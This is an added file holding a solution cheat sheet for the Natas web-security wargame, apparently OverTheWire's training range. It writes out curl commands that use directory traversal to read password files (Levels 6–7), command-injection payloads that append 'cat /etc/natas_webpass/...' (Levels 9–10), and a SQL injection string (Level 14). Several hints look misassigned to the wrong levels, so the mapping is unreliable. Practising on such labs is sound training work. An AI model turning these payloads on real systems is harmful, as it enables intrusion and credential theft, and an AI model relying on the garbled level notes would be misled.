@@ -1,0 +1,87 @@
+COMMANDS LIST-NATAS
+________________________________________
+Level 1
+Use: Right-click → View Source
+Find the password in HTML comments.
+________________________________________
+Level 2
+Inspect elements → check inside an img or src file comment.
+________________________________________
+Level 3
+Use curl:
+bash
+CopyEdit
+curl -u natas3:<password> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+________________________________________
+Level 4
+Check HTTP Referer:
+bash
+CopyEdit
+curl -u natas4:<password> -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
+________________________________________
+Level 5
+Uses cookies:
+bash
+CopyEdit
+curl -u natas5:<password> --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/
+________________________________________
+Level 6
+Check source for include files. Use directory traversal.
+bash
+CopyEdit
+curl -u natas6:<password> http://natas6.natas.labs.overthewire.org/?include=../../../../etc/natas_webpass/natas7
+________________________________________
+Level 7
+Use two parameters:
+bash
+CopyEdit
+curl -u natas7:<password> "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8"
+________________________________________
+Level 8
+Decode XOR encryption in Python (you already did this).
+________________________________________
+Level 9
+Command injection:
+bash
+CopyEdit
+curl -u natas9:<password> "http://natas9.natas.labs.overthewire.org/?needle=blah; cat /etc/natas_webpass/natas10"
+________________________________________
+Level 10
+Same as 9 but now filter ;
+Try:
+bash
+CopyEdit
+| cat /etc/natas_webpass/natas11
+________________________________________
+Level 11 - 12
+Cookie manipulation using Python or Burp Suite. Use requests in Python to decode and re-encode cookies.
+________________________________________
+Level 13
+Upload an image, change the header to include PHP, and bypass filetype check.
+________________________________________
+Level 14
+SQL Injection:
+sql
+CopyEdit
+' OR 1=1 -- 
+________________________________________
+Level 15 - 17
+Use time-based or blind SQL injections.
+________________________________________
+Level 18
+Cookie manipulation and brute-forcing session IDs.
+________________________________________
+Level 19 - 20
+More complex session brute-force. Use scripts to loop through session IDs and check responses.
+________________________________________
+Level 21 - 24
+Use internal services, SSH, port forwarding. Tools: ssh, netcat, curl.
+________________________________________
+Level 25 - 34
+Advanced web security:
+•	SSTI (Server-Side Template Injection)
+•	Log poisoning
+•	PHP filters
+•	Deserialization
+•	CRLF injection
+•	Burp Suite, nc, curl, gdb
